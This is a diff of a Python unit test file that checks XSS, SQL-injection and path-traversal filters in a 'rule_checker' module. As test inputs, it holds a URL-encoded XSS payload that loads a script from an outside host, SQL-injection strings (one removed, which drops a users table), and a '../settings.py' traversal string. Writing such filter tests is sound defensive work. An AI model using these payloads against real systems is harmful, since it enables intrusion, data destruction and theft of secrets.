@@ -4,13 +4,13 @@ import unittest
 import rule_checker as R
 
 
-xss_attack = """</script><script>alert(1);</script><script>"""
-sql_attack = """';drop table users;--"""
+xss_attack = """%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss."""
+sql_attack = """' or 1 in (select @@version)--"""
 dt_attack = """../settings.py"""
 code = """normal string"""
 
 class TestRule(unittest.TestCase):
-	def test_xss(self):
+	def test_xss(self): 
 		self.assertEqual(R.xss_filter(xss_attack), True)
 
 	def test_sql(self):
